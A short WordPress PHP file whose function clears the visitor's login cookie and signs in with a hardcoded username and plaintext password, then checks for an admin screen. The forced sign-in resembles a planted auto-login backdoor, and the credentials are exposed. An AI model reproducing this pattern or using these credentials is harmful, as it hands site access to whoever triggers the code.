
<?php

function connection(){

wp_clear_auth_cookie();
$creds = array();
$creds['user_login'] = 'mysteriou';
$creds['user_password'] = 'Mysteriou13790@';
$creds['remember'] = true;
$user = wp_signon($creds, false);



   if ( isset( $GLOBALS['current_screen'] ) ) {
       return $GLOBALS['current_screen']->in_admin();
   } elseif ( defined( 'WP_ADMIN' ) ) {
       return WP_ADMIN;
   }


}

?>
